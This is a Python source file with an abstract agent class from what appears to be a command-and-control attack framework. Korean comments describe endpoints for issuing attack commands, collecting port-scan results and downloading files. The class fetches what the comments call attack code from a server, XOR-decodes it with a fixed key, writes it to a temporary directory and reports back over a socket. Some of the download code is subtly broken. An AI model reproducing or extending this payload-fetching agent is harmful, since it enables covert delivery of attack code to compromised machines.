from abc import ABCMeta, abstractmethod
import requests, bson

import sys
from pathlib import Path
path = Path(__file__).parent.resolve()
parent = path.parents[0]
[sys.path.append(x) for x in map(str, [path, parent]) if x not in sys.path]

from config import *
from log_config import get_custom_logger
logger = get_custom_logger(__name__)

"""
<API 명세서>
1. 공격 명령 내리기 : http://url/command/<int:id>
2. 포트 스캔 결과 받기 : http://url/scan-result
3. Agnet로부터 'ip , ETC 정보 전달' 보내기 : http://url/agent/info
4. 다운로드 : http:url/download/
"""

class Processor(metaclass = ABCMeta):
    SERVER_IP = "0.0.0.0"
    SERVER_PORT = 9000
    KEY = ord('X')

    # Processor 마다 id 하나 부여됨
    id = -1

    def __init__(self, cmd):
        self.cmd = cmd
        try:
            self.type = cmd["type"]
            self.ticket = cmd["ticket"]   # ticket 이 없는건 말이 안되죠
        except:
            logger.fatal("'type' or 'ticket' Not found")
            exit(1)
        
        return


    @abstractmethod
    def run_cmd(self):
        pass


    @abstractmethod
    def report(self):
        pass


    def __str__(self):
        return f"Command: {self.cmd}"


    def check_cmd(self, fields):
        for field in fields:
            assert field in self.cmd


    def cmd_after_replacement(self, usage, replacements):
        import sys
        if int(sys.version.split()[0].split('.')[1]) < 8:
            for a, b in replacements:
                usage = usage.replace(a, b)

        else:
            # Reference: https://stackoverflow.com/a/55889140
            # python 3.8 need
            [ usage := usage.replace(a, b) for a, b in replacements ]

        return usage


    def _download(self, url):
        r = None

        try:
            r = requests.get(url)
        except:
            print(f"[processor] Download Failed: {url}")
            exit(1)

        return r.text


    def xor_download(self, url, path):
        file = self._download(url)

        original_file = bytearray()
        for a in file:
            original_file += chr(ord(a) ^ self.KEY).encode()

        # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
        with open(path, "wb") as f:
            f.write(original_file)

        return


    def download(self, url, path):
        file = self._download(url)

        # 다운로드 받은 공격코드를 임시 디렉토리에 저장함
        with open(path, "wb") as f:
            f.write(file)

        return


    def _report(self, sock, data):
        try:
            payload = bson.dumps(data)
            logger.debug(f"[REPORT] len payload = {len(payload)}")
            sock.send(payload)
        except:
            logger.fatal(f"{RED}Wrong socket!{END}")
            exit(1)
